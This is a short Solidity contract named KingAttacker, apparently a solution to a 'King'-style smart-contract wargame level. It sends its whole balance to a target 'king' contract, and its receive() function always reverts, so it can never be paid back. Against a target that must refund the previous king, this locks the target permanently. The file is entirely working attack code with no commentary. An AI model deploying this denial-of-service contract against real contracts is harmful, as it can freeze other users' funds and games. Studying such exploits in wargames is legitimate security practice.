// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingAttacker {
    address payable public king;
    bool public failed;

    constructor(address payable _king) public payable {
        king = _king;
    }

    function transferEther() public {
        (bool succeeded,) = king.call{value: address(this).balance}("");

        if (!succeeded) {
            failed = true;
        }
    }

    receive() external payable {
        revert();
    }
}
